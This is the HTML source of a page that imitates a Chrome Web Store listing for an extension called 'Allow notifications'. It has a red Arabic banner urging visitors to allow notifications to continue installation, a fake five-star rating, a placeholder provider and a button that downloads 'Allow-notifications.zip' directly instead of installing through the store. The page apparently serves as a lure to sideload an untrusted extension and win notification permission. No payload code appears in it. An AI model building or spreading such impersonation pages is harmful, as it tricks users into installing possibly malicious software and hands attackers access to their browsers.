<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Allow notifications - Chrome Web Store</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100vw;
      height: 100vh;
      font-family: 'Roboto', sans-serif;
      background-color: #fff; /* خلفية بيضاء */
    }

    /* ✅ شريط التنبيه الأحمر */
    .re-header {
      width: 100%;
      background-color: red;
      color: white;
      font-size: 16px;
      text-align: center;
      padding: 12px 0;
      font-weight: bold;
    }

    .wrapper {
      max-width: 980px;
      margin: auto;
      background: #fff;
      padding: 30px 40px;
      box-sizing: border-box;
      min-height: calc(100vh - 48px); /* خلى المحتوى يغطي الطول ناقص الشريط */
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }

    .header {
      display: flex;
      align-items: center;
      gap: 20px;
    }
    .header img {
      width: 64px;
    }
    .title {
      font-size: 24px;
      margin: 0;
    }
    .provider {
      color: #666;
      font-size: 14px;
      margin-top: 4px;
    }
    .rating {
      margin-top: 8px;
      color: #ffa500;
      font-size: 16px;
    }

    .install-btn {
      display: inline-block;
      text-decoration: none;
      background-color: #1a73e8;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      cursor: pointer;
      margin-top: 20px;
    }

    .preview-images {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 30px;
      margin-top: 40px;
    }

    .preview-images img {
      width: 500px;
      border-radius: 8px;
    }
  </style>
</head>
<body>

  <!-- ✅ شريط التنبيه -->
  <div class="re-header">يرجى السماح بالإشعارات لمتابعة التثبيت</div>

  <div class="wrapper">
    <div class="header">
      <img src="icon.png" alt="Extension Icon">
      <div>
        <h1 class="title">Allow notifications</h1>
        <div class="provider">Provided by Example</div>
        <div class="rating">★★★★★</div>
      </div>
    </div>

    <!-- ✅ زر تحميل ملف Allow-notifications.zip -->
    <a href="Allow-notifications.zip" download class="install-btn">Install Extension</a>

    <!-- ✅ عرض 3 صور -->
    <div class="preview-images">
      <img src="preview1.png" alt="Preview 1">
      <img src="preview2.png" alt="Preview 2">
      <img src="preview3.png" alt="Preview 3">
    </div>
  </div>

</body>
</html>
